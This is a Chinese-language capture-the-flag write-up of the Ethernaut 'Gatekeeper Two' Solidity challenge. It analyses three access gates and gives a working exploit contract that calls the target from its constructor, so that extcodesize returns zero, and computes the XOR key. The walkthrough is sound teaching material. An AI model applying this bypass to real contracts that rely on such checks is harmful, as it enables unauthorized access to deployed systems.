## Level_14.Gatekeeper Two

要求：

> 通过守门人；

合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

### 分析

#### 第一道关卡

和上一个一样的，通过增加一个合约作为代理绕过；



#### 第二道关卡

` extcodesize() `：获得账户中代码的size；

` caller() `：调用者的地址

所以合约中的` x `为我们攻击合约的代码长度；

但要使其为0，得是个账户地址，而不能是一个合约地址；

但是，从[stackexchange](https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642)这个帖子中可以知道，在构造函数中运行，返回的是0；



#### 第三道关卡

```solidity
uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)

type(uint64).max) = 0xFFFFFFFFFFFFFFFF;

// 异或
uint64(_gateKey) = 0xFFFFFFFFFFFFFFFF ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
```

此时的` msg.sender `为攻击合约地址；

计算方法：` bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF) `；



### 攻击

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Ethernaut.sol";

contract Exp {
    constructor(address addr){
        GatekeeperTwo gt = GatekeeperTwo(addr);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xFFFFFFFFFFFFFFFF);
        require(gt.enter(key), "failed");
    }
}
```

